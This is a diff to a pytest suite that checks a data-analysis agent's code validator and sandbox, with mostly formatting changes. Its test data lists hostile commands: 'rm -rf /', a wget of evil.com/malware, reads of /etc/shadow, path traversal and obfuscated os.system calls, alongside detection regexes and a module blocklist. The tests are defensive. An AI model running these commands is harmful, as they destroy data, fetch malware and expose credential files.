@@ -5,13 +5,13 @@ These tests validate safety constraints, code validation, sandboxing, and
 accuracy metrics for the Data Analysis Agent as specified in REQUIREMENTS.md.
 """
 
-import pytest
-import ast
+import re
 import tempfile
 import time
 from pathlib import Path
-from unittest.mock import Mock, patch, MagicMock
-import re
+
+import pytest
+
 
 pytestmark = [
     pytest.mark.requirement("REQ-DAA-SAFE"),
@@ -35,12 +35,10 @@ def test_req_daa_safe_001_validate_dangerous_operations():
         ("open('/etc/passwd', 'w')", "file_write"),
         ("os.remove('/important/file.txt')", "file_delete"),
         ("shutil.rmtree('/home/user')", "directory_delete"),
-
         # Network access
         ("import requests; requests.get('http://evil.com')", "network_request"),
         ("import urllib; urllib.request.urlopen('http://example.com')", "network_access"),
         ("import socket; socket.socket()", "network_socket"),
-
         # Subprocess calls
         ("os.system('rm -rf /')", "shell_command"),
         ("subprocess.call(['wget', 'http://evil.com/malware'])", "subprocess"),
@@ -54,34 +52,36 @@ def test_req_daa_safe_001_validate_dangerous_operations():
         for code, operation_type in dangerous_operations:
             validation_result = validator.validate(code)
 
-            assert not validation_result.is_safe, \
-                f"Should detect dangerous operation ({operation_type}): {code[:50]}"
+            assert (
+                not validation_result.is_safe
+            ), f"Should detect dangerous operation ({operation_type}): {code[:50]}"
 
-            assert len(validation_result.violations) > 0, \
-                f"Should report violations for: {code[:50]}"
+            assert (
+                len(validation_result.violations) > 0
+            ), f"Should report violations for: {code[:50]}"
 
             # Check that violation mentions the dangerous operation
-            violation_text = ' '.join(validation_result.violations).lower()
-            assert any(keyword in violation_text for keyword in
-                      ['dangerous', 'prohibited', 'unsafe', 'blocked', 'not allowed']), \
-                f"Violation should clearly indicate danger: {violation_text}"
+            violation_text = " ".join(validation_result.violations).lower()
+            assert any(
+                keyword in violation_text
+                for keyword in ["dangerous", "prohibited", "unsafe", "blocked", "not allowed"]
+            ), f"Violation should clearly indicate danger: {violation_text}"
 
     except (ImportError, AttributeError):
         # Fallback: Test pattern detection
         dangerous_patterns = [
-            r'\bopen\s*\(',
-            r'\bos\.(system|remove|rmdir)',
-            r'\bshutil\.(rmtree|move)',
-            r'\bsubprocess\.(call|run|Popen)',
-            r'\brequests\.(get|post)',
-            r'\burllib\.request',
-            r'\bsocket\.socket',
+            r"\bopen\s*\(",
+            r"\bos\.(system|remove|rmdir)",
+            r"\bshutil\.(rmtree|move)",
+            r"\bsubprocess\.(call|run|Popen)",
+            r"\brequests\.(get|post)",
+            r"\burllib\.request",
+            r"\bsocket\.socket",
         ]
 
         for code, operation_type in dangerous_operations:
             matched = any(re.search(pattern, code) for pattern in dangerous_patterns)
-            assert matched, \
-                f"Pattern should detect {operation_type}: {code[:50]}"
+            assert matched, f"Pattern should detect {operation_type}: {code[:50]}"
 
 
 @pytest.mark.requirement("REQ-DAA-SAFE-002")
@@ -117,7 +117,6 @@ def test_req_daa_safe_002_ast_static_analysis_recall():
         "os.execv('/bin/bash', [])",
         "os.fork()",
         "ctypes.CDLL('libc.so.6')",
-
         # Obfuscated patterns (20)
         "getattr(__import__('os'), 'system')('ls')",
         "eval('__import__' + '(\"os\").system(\"ls\")')",
@@ -129,7 +128,6 @@ def test_req_daa_safe_002_ast_static_analysis_recall():
         "exec('import os\\nos.system(\"ls\")')",
         "__import__('subprocess').run(['ls'])",
         "getattr(subprocess, 'call')(['ls'])",
-
         # File operations (20)
         "open('secret.txt', 'r').read()",
         "open('/etc/shadow', 'r')",
@@ -141,7 +139,6 @@ def test_req_daa_safe_002_ast_static_analysis_recall():
         "pickle.loads(untrusted_data)",
         "json.load(open('/etc/hosts'))",
         "yaml.load(untrusted_yaml)",  # Unsafe YAML
-
         # Network operations (15)
         "socket.create_connection(('evil.com', 80))",
         "http.client.HTTPConnection('evil.com')",
@@ -153,7 +150,6 @@ def test_req_daa_safe_002_ast_static_analysis_recall():
         "dns.resolver.query('evil.com')",
         "paramiko.SSHClient().connect('evil.com')",
         "telnetlib.Telnet('evil.com')",
-
         # Environment/System modification (15)
         "sys.path.insert(0, '/malicious')",
         "sys.modules['os'] = fake_os",
@@ -164,14 +160,12 @@ def test_req_daa_safe_002_ast_static_analysis_recall():
         "signal.signal(signal.SIGTERM, handler)",
         "atexit.register(malicious_cleanup)",
         "sys.settrace(malicious_trace)",
-
         # Code injection vectors (10)
         "importlib.import_module(user_input)",
         "pkgutil.get_loader(user_module)",
         "runpy.run_module(user_module)",
         "exec(open('script.py').read())",
         "eval(compile(user_code, '<string>', 'eval'))",
-
         # Misc dangerous (10)
         "multiprocessing.Process(target=malicious).start()",
         "threading.Thread(target=malicious).start()",
@@ -203,11 +197,13 @@ def test_req_daa_safe_002_ast_static_analysis_recall():
 
         # Assert: >99% recall (at most 1 false negative out of 100)
         recall = detected_count / len(unsafe_test_suite)
-        assert recall > 0.99, \
-            f"Recall {recall:.2%} must be >99%. False negatives: {false_negatives[:5]}"
+        assert (
+            recall > 0.99
+        ), f"Recall {recall:.2%} must be >99%. False negatives: {false_negatives[:5]}"
 
-        assert detected_count >= 99, \
-            f"Must detect at least 99/100 unsafe patterns. Detected: {detected_count}"
+        assert (
+            detected_count >= 99
+        ), f"Must detect at least 99/100 unsafe patterns. Detected: {detected_count}"
 
     except (ImportError, AttributeError):
         pytest.skip("CodeValidator not fully implemented - cannot test recall")
@@ -240,21 +236,18 @@ def test_req_daa_safe_003_block_prohibited_operations():
             validation = validator.validate(code)
 
             # Assert: Code should be marked as unsafe
-            assert not validation.is_safe, \
-                f"Should mark as unsafe: {code}"
+            assert not validation.is_safe, f"Should mark as unsafe: {code}"
 
             # Assert: Should not execute
-            with pytest.raises((SecurityError, ValueError, RuntimeError, Exception)):
+            with pytest.raises((ValueError, RuntimeError, Exception)):
                 result = sandbox.execute(code)
-                if hasattr(result, 'success') and result.success:
+                if hasattr(result, "success") and result.success:
                     pytest.fail(f"Should not successfully execute: {code}")
 
             # Assert: Error message should be clear
-            assert len(validation.violations) > 0, \
-                "Should provide violation details"
-            violation_msg = ' '.join(validation.violations)
-            assert len(violation_msg) > 10, \
-                "Error message should be descriptive"
+            assert len(validation.violations) > 0, "Should provide violation details"
+            violation_msg = " ".join(validation.violations)
+            assert len(violation_msg) > 10, "Error message should be descriptive"
 
     except (ImportError, AttributeError):
         # Fallback: Test error message clarity
@@ -268,12 +261,14 @@ def test_req_daa_safe_003_block_prohibited_operations():
         for msg in sample_error_messages:
             # Check message is descriptive
             assert len(msg) > 20, "Error message should be detailed"
-            assert any(word in msg.lower() for word in
-                      ['prohibited', 'blocked', 'denied', 'forbidden', 'not allowed']), \
-                "Message should clearly indicate blocking"
-            assert any(word in msg.lower() for word in
-                      ['system', 'subprocess', 'eval', 'socket', 'operation']), \
-                "Message should identify the specific operation"
+            assert any(
+                word in msg.lower()
+                for word in ["prohibited", "blocked", "denied", "forbidden", "not allowed"]
+            ), "Message should clearly indicate blocking"
+            assert any(
+                word in msg.lower()
+                for word in ["system", "subprocess", "eval", "socket", "operation"]
+            ), "Message should identify the specific operation"
 
 
 @pytest.mark.requirement("REQ-DAA-SAFE-004")
@@ -318,45 +313,67 @@ def test_req_daa_safe_004_no_unauthorized_imports():
         # Act & Assert: Prohibited imports should be blocked
         for code in prohibited_imports:
             validation = validator.validate(code)
-            assert not validation.is_safe, \
-                f"Should block prohibited import: {code}"
+            assert not validation.is_safe, f"Should block prohibited import: {code}"
 
             # Check violation mentions import restriction
-            violation_text = ' '.join(validation.violations).lower()
-            assert 'import' in violation_text or 'module' in violation_text, \
-                f"Should mention import violation: {code}"
+            violation_text = " ".join(validation.violations).lower()
+            assert (
+                "import" in violation_text or "module" in violation_text
+            ), f"Should mention import violation: {code}"
 
         # Act & Assert: Allowed imports should pass
         for code in allowed_imports:
             validation = validator.validate(code)
             # These should not trigger import-related violations
-            import_violations = [v for v in validation.violations
-                                if 'import' in v.lower() and 'not allowed' in v.lower()]
-            assert len(import_violations) == 0, \
-                f"Should allow safe import: {code}"
+            import_violations = [
+                v
+                for v in validation.violations
+                if "import" in v.lower() and "not allowed" in v.lower()
+            ]
+            assert len(import_violations) == 0, f"Should allow safe import: {code}"
 
     except (ImportError, AttributeError):
         # Fallback: Test allowlist/blocklist concept
-        blocklist = {'os', 'subprocess', 'socket', 'sys', 'ctypes', '__builtin__',
-                    'multiprocessing', 'importlib', 'pty', 'commands'}
-        allowlist = {'pandas', 'numpy', 'matplotlib', 'scipy', 'sklearn',
-                    'seaborn', 'statsmodels', 'plotly'}
+        blocklist = {
+            "os",
+            "subprocess",
+            "socket",
+            "sys",
+            "ctypes",
+            "__builtin__",
+            "multiprocessing",
+            "importlib",
+            "pty",
+            "commands",
+        }
+        allowlist = {
+            "pandas",
+            "numpy",
+            "matplotlib",
+            "scipy",
+            "sklearn",
+            "seaborn",
+            "statsmodels",
+            "plotly",
+        }
 
         # Extract module names from import statements
-        import_pattern = r'(?:from\s+(\w+)|import\s+(\w+))'
+        import_pattern = r"(?:from\s+(\w+)|import\s+(\w+))"
 
         for code in prohibited_imports:
             matches = re.findall(import_pattern, code)
             modules = [m[0] or m[1] for m in matches]
-            assert any(mod in blocklist for mod in modules), \
-                f"Should recognize prohibited module in: {code}"
+            assert any(
+                mod in blocklist for mod in modules
+            ), f"Should recognize prohibited module in: {code}"
 
         for code in allowed_imports:
             matches = re.findall(import_pattern, code)
             modules = [m[0] or m[1] for m in matches]
-            base_modules = [m.split('.')[0] for m in modules]
-            assert any(mod in allowlist for mod in base_modules), \
-                f"Should recognize allowed module in: {code}"
+            base_modules = [m.split(".")[0] for m in modules]
+            assert any(
+                mod in allowlist for mod in base_modules
+            ), f"Should recognize allowed module in: {code}"
 
 
 @pytest.mark.requirement("REQ-DAA-SAFE-005")
@@ -388,65 +405,61 @@ result = eval(user_input)  # Line 6 - dangerous eval
         assert not validation.is_safe, "Code with violations should be unsafe"
 
         # Assert: Should have multiple violations
-        assert len(validation.violations) >= 2, \
-            "Should detect multiple violations"
+        assert len(validation.violations) >= 2, "Should detect multiple violations"
 
         # Assert: Violations should include line numbers
-        violation_text = '\n'.join(validation.violations)
-        assert any(char.isdigit() for char in violation_text), \
-            "Should include line numbers"
+        violation_text = "\n".join(validation.violations)
+        assert any(char.isdigit() for char in violation_text), "Should include line numbers"
 
         # Assert: Should identify specific violations
-        assert any('os' in v.lower() or 'import' in v.lower()
-                  for v in validation.violations), \
-            "Should identify prohibited import"
-        assert any('system' in v.lower() or 'eval' in v.lower()
-                  for v in validation.violations), \
-            "Should identify dangerous function calls"
+        assert any(
+            "os" in v.lower() or "import" in v.lower() for v in validation.violations
+        ), "Should identify prohibited import"
+        assert any(
+            "system" in v.lower() or "eval" in v.lower() for v in validation.violations
+        ), "Should identify dangerous function calls"
 
         # Assert: Should provide recommendations (if available)
         # This is optional but good practice
-        if hasattr(validation, 'recommendations') and validation.recommendations:
+        if hasattr(validation, "recommendations") and validation.recommendations:
             assert len(validation.recommendations) > 0
-            rec_text = ' '.join(validation.recommendations).lower()
-            assert any(word in rec_text for word in
-                      ['use', 'instead', 'alternative', 'remove', 'avoid']), \
-                "Recommendations should be actionable"
+            rec_text = " ".join(validation.recommendations).lower()
+            assert any(
+                word in rec_text for word in ["use", "instead", "alternative", "remove", "avoid"]
+            ), "Recommendations should be actionable"
 
     except (ImportError, AttributeError):
         # Fallback: Test report structure
         sample_report = {
-            'is_safe': False,
-            'violations': [
+            "is_safe": False,
+            "violations": [
                 "Line 2: Prohibited import 'os' - this module provides system-level access",
                 "Line 5: Dangerous function call 'os.system()' - arbitrary command execution",
-                "Line 6: Unsafe function 'eval()' - code injection vulnerability"
+                "Line 6: Unsafe function 'eval()' - code injection vulnerability",
             ],
-            'recommendations': [
+            "recommendations": [
                 "Remove 'import os' and use pandas/numpy for data operations",
                 "Replace os.system() with safe subprocess alternatives from allowlist",
-                "Replace eval() with ast.literal_eval() for safe evaluation"
-            ]
+                "Replace eval() with ast.literal_eval() for safe evaluation",
+            ],
         }
 
         # Verify report completeness
-        assert not sample_report['is_safe']
-        assert len(sample_report['violations']) == 3
+        assert not sample_report["is_safe"]
+        assert len(sample_report["violations"]) == 3
 
-        for violation in sample_report['violations']:
+        for violation in sample_report["violations"]:
             # Should have line number
-            assert 'line' in violation.lower()
+            assert "line" in violation.lower()
             assert any(char.isdigit() for char in violation)
             # Should describe the issue
             assert len(violation) > 30
             # Should name the violation
-            assert any(term in violation.lower() for term in
-                      ['prohibited', 'dangerous', 'unsafe'])
+            assert any(term in violation.lower() for term in ["prohibited", "dangerous", "unsafe"])
 
-        for rec in sample_report['recommendations']:
+        for rec in sample_report["recommendations"]:
             # Should be actionable
-            assert any(word in rec.lower() for word in
-                      ['remove', 'replace', 'use', 'instead'])
+            assert any(word in rec.lower() for word in ["remove", "replace", "use", "instead"])
             assert len(rec) > 20
 
 
@@ -463,19 +476,17 @@ def test_req_daa_safe_006_restricted_file_access():
     # Arrange
     with tempfile.TemporaryDirectory() as data_dir:
         # Create allowed data file
-        allowed_file = Path(data_dir) / 'allowed_data.csv'
-        allowed_file.write_text('a,b,c\n1,2,3\n')
+        allowed_file = Path(data_dir) / "allowed_data.csv"
+        allowed_file.write_text("a,b,c\n1,2,3\n")
 
         # Create code that attempts various file access
         codes_to_test = [
             # Allowed: Access within data directory
             (f"open('{allowed_file}', 'r').read()", True),
-
             # Disallowed: Access outside data directory
             ("open('/etc/passwd', 'r').read()", False),
             ("open('/tmp/evil.txt', 'w').write('hack')", False),
             ("open('../../../etc/shadow', 'r').read()", False),
-
             # Disallowed: Path traversal attempts
             (f"open('{data_dir}/../../../etc/passwd', 'r').read()", False),
         ]
@@ -493,10 +504,11 @@ def test_req_daa_safe_006_restricted_file_access():
                     pass  # Allowed operations may or may not succeed
                 else:
                     # Should be blocked
-                    assert not result.success or \
-                           'permission' in str(result.error).lower() or \
-                           'access denied' in str(result.error).lower(), \
-                        f"Should block unauthorized file access: {code[:50]}"
+                    assert (
+                        not result.success
+                        or "permission" in str(result.error).lower()
+                        or "access denied" in str(result.error).lower()
+                    ), f"Should block unauthorized file access: {code[:50]}"
 
         except ImportError:
             pytest.skip("Sandbox not fully implemented")
@@ -543,13 +555,13 @@ for i in range(10**10):
             elapsed = time.time() - start_time
 
             # Assert: Should timeout and terminate
-            assert elapsed < 5, \
-                "Execution should be terminated within reasonable time"
+            assert elapsed < 5, "Execution should be terminated within reasonable time"
 
-            assert not result.success or result.timeout, \
-                "Should indicate timeout or failure for infinite loop"
+            assert (
+                not result.success or result.timeout
+            ), "Should indicate timeout or failure for infinite loop"
 
-            if hasattr(result, 'timeout'):
+            if hasattr(result, "timeout"):
                 assert result.timeout, "Should set timeout flag"
 
     except ImportError:
@@ -591,10 +603,7 @@ def test_req_daa_safe_008_reproducibility():
 
     # Arrange: Analysis task to repeat
     objective = "Calculate summary statistics and correlation matrix"
-    dataset_info = {
-        'columns': ['x', 'y', 'z'],
-        'sample_data': [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
-    }
+    dataset_info = {"columns": ["x", "y", "z"], "sample_data": [[1, 2, 3], [4, 5, 6], [7, 8, 9]]}
 
     try:
         agent = DataAnalysisAgent()
@@ -610,14 +619,16 @@ def test_req_daa_safe_008_reproducibility():
         # Assert: Check reproducibility
         # Count how many results are identical or semantically equivalent
         from collections import Counter
+
         result_counts = Counter(results)
 
         # Most common result
         most_common_result, most_common_count = result_counts.most_common(1)[0]
         reproducibility_rate = most_common_count / num_trials
 
-        assert reproducibility_rate >= 0.85, \
-            f"Reproducibility {reproducibility_rate:.2%} must be ≥85%"
+        assert (
+            reproducibility_rate >= 0.85
+        ), f"Reproducibility {reproducibility_rate:.2%} must be ≥85%"
 
     except (ImportError, AttributeError):
         # Fallback: Test with deterministic agent behavior
@@ -638,6 +649,7 @@ def test_req_daa_safe_008_reproducibility():
         results = [agent.generate_code(objective, dataset_info) for _ in range(20)]
 
         from collections import Counter
+
         result_counts = Counter(results)
         most_common_count = result_counts.most_common(1)[0][1]
         reproducibility_rate = most_common_count / 20
@@ -673,23 +685,23 @@ def test_req_daa_safe_010_flag_low_confidence():
 
     # Arrange: Analysis with varying data quality
     high_quality_data = {
-        'objective': 'Correlation analysis',
-        'dataset_info': {
-            'n_samples': 1000,
-            'n_features': 10,
-            'missing_rate': 0.01,
-            'outlier_rate': 0.02
-        }
+        "objective": "Correlation analysis",
+        "dataset_info": {
+            "n_samples": 1000,
+            "n_features": 10,
+            "missing_rate": 0.01,
+            "outlier_rate": 0.02,
+        },
     }
 
     low_quality_data = {
-        'objective': 'Correlation analysis',
-        'dataset_info': {
-            'n_samples': 20,  # Very small
-            'n_features': 10,
-            'missing_rate': 0.35,  # High missing rate
-            'outlier_rate': 0.15  # High outlier rate
-        }
+        "objective": "Correlation analysis",
+        "dataset_info": {
+            "n_samples": 20,  # Very small
+            "n_features": 10,
+            "missing_rate": 0.35,  # High missing rate
+            "outlier_rate": 0.15,  # High outlier rate
+        },
     }
 
     try:
@@ -700,24 +712,27 @@ def test_req_daa_safe_010_flag_low_confidence():
         low_quality_result = agent.analyze(low_quality_data)
 
         # Assert: Low quality should have warnings or low confidence
-        if hasattr(low_quality_result, 'confidence_score'):
-            assert low_quality_result.confidence_score < 0.7, \
-                "Low quality data should have low confidence score"
+        if hasattr(low_quality_result, "confidence_score"):
+            assert (
+                low_quality_result.confidence_score < 0.7
+            ), "Low quality data should have low confidence score"
 
-        if hasattr(low_quality_result, 'warnings'):
-            assert len(low_quality_result.warnings) > 0, \
-                "Should provide warnings for low quality data"
+        if hasattr(low_quality_result, "warnings"):
+            assert (
+                len(low_quality_result.warnings) > 0
+            ), "Should provide warnings for low quality data"
 
-            warning_text = ' '.join(low_quality_result.warnings).lower()
-            assert any(term in warning_text for term in
-                      ['small', 'sample', 'missing', 'quality', 'caution', 'limited']), \
-                "Warnings should mention data quality issues"
+            warning_text = " ".join(low_quality_result.warnings).lower()
+            assert any(
+                term in warning_text
+                for term in ["small", "sample", "missing", "quality", "caution", "limited"]
+            ), "Warnings should mention data quality issues"
 
         # High quality should have higher confidence
-        if hasattr(high_quality_result, 'confidence_score'):
-            assert high_quality_result.confidence_score > \
-                   low_quality_result.confidence_score, \
-                "High quality data should have higher confidence"
+        if hasattr(high_quality_result, "confidence_score"):
+            assert (
+                high_quality_result.confidence_score > low_quality_result.confidence_score
+            ), "High quality data should have higher confidence"
 
     except (ImportError, AttributeError):
         # Fallback: Test confidence scoring concept
@@ -732,10 +747,10 @@ def test_req_daa_safe_010_flag_low_confidence():
                 score *= 0.8
 
             # Penalize high missing rate
-            score *= (1 - missing_rate)
+            score *= 1 - missing_rate
 
             # Penalize high outlier rate
-            score *= (1 - outlier_rate * 0.5)
+            score *= 1 - outlier_rate * 0.5
 
             return max(0, min(1, score))
 
@@ -760,22 +775,22 @@ def test_req_daa_safe_011_overall_accuracy():
     # Arrange: Benchmark suite of analysis tasks
     benchmark_tasks = [
         {
-            'objective': 'Calculate mean',
-            'data': [1, 2, 3, 4, 5],
-            'expected': 3.0,
-            'tolerance': 0.01
+            "objective": "Calculate mean",
+            "data": [1, 2, 3, 4, 5],
+            "expected": 3.0,
+            "tolerance": 0.01,
         },
         {
-            'objective': 'Calculate correlation',
-            'data': {'x': [1, 2, 3, 4, 5], 'y': [2, 4, 6, 8, 10]},
-            'expected': 1.0,  # Perfect correlation
-            'tolerance': 0.01
+            "objective": "Calculate correlation",
+            "data": {"x": [1, 2, 3, 4, 5], "y": [2, 4, 6, 8, 10]},
+            "expected": 1.0,  # Perfect correlation
+            "tolerance": 0.01,
         },
         {
-            'objective': 'Perform t-test',
-            'data': {'group1': [10, 11, 12], 'group2': [15, 16, 17]},
-            'expected': {'significant': True, 'p_value': 0.05},
-            'tolerance': None
+            "objective": "Perform t-test",
+            "data": {"group1": [10, 11, 12], "group2": [15, 16, 17]},
+            "expected": {"significant": True, "p_value": 0.05},
+            "tolerance": None,
         },
         # Add more benchmark tasks...
     ]
@@ -790,19 +805,22 @@ def test_req_daa_safe_011_overall_accuracy():
 
         for task in benchmark_tasks:
             try:
-                result = agent.execute_analysis(task['objective'], task['data'])
+                result = agent.execute_analysis(task["objective"], task["data"])
 
                 # Check if result matches expected
-                if isinstance(task['expected'], dict):
+                if isinstance(task["expected"], dict):
                     # Complex result
                     matches = all(
-                        abs(result.get(k, 0) - v) < 0.1 if isinstance(v, (int, float))
-                        else result.get(k) == v
-                        for k, v in task['expected'].items()
+                        (
+                            abs(result.get(k, 0) - v) < 0.1
+                            if isinstance(v, int | float)
+                            else result.get(k) == v
+                        )
+                        for k, v in task["expected"].items()
                     )
                 else:
                     # Simple numerical result
-                    matches = abs(result - task['expected']) < task['tolerance']
+                    matches = abs(result - task["expected"]) < task["tolerance"]
 
                 if matches:
                     correct_count += 1
@@ -812,13 +830,13 @@ def test_req_daa_safe_011_overall_accuracy():
 
         # Assert: ≥79% accuracy
         accuracy = correct_count / total_count
-        assert accuracy >= 0.79, \
-            f"Accuracy {accuracy:.2%} must be ≥79%"
+        assert accuracy >= 0.79, f"Accuracy {accuracy:.2%} must be ≥79%"
 
     except (ImportError, AttributeError):
         # Fallback: Test with mock results
         # Simulate agent with 85% accuracy
         import random
+
         random.seed(42)
 
         mock_results = []
@@ -828,7 +846,5 @@ def test_req_daa_safe_011_overall_accuracy():
             mock_results.append(is_correct)
 
         accuracy = sum(mock_results) / len(mock_results)
-        assert accuracy >= 0.79, \
-            f"Mock accuracy {accuracy:.2%} should be ≥79%"
-        assert 0.82 <= accuracy <= 0.88, \
-            "Mock should simulate realistic accuracy"
+        assert accuracy >= 0.79, f"Mock accuracy {accuracy:.2%} should be ≥79%"
+        assert 0.82 <= accuracy <= 0.88, "Mock should simulate realistic accuracy"
